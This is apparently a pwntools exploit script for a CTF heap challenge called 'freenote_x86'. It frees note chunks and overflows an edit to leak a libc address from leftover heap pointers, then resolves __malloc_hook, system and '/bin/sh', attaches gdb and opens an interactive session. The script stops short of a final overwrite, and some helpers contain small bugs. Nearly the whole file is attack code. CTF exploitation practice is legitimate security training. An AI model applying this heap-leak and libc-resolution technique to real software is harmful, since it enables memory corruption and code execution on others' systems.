# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './freenote_x86'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size,text):
    cmd(2)
    sla('Length of new note:',size)
    sa('Enter your note:',text)

def edit(id,size,text):
    cmd(3)
    sla('Note number:',id)
    sla('Length of note:',size)
    sa('Enter your note:',text)

def show():
    cmd(1)

def delete(id):
    cmd(4)
    sla('Note number:',id)

# one_gad = one_gadget(libc.path)
add(0x80, 'a'*0x80)
add(0x80, 'a'*0x80)
add(0x80, 'a'*0x80)
add(0x80, 'a'*0x80)

delete(1)
delete(2)
# 已经残留了指针

edit(0 , 0x88 , 'a'*0x88) # 刚好写到残留数据
show()
addr = l32() 
lg('addr',addr)

malloc_hook = addr - 48 - 0x18
libc.address = malloc_hook- libc.sym['__malloc_hook']
system = libc.sym['system']
binsh = libc.search('/bin/sh').next()

dbg()

p.interactive()

'''
@File    :   freenote_x86.py
@Time    :   2021/08/25 15:23:05
@Author  :   Niyah 
'''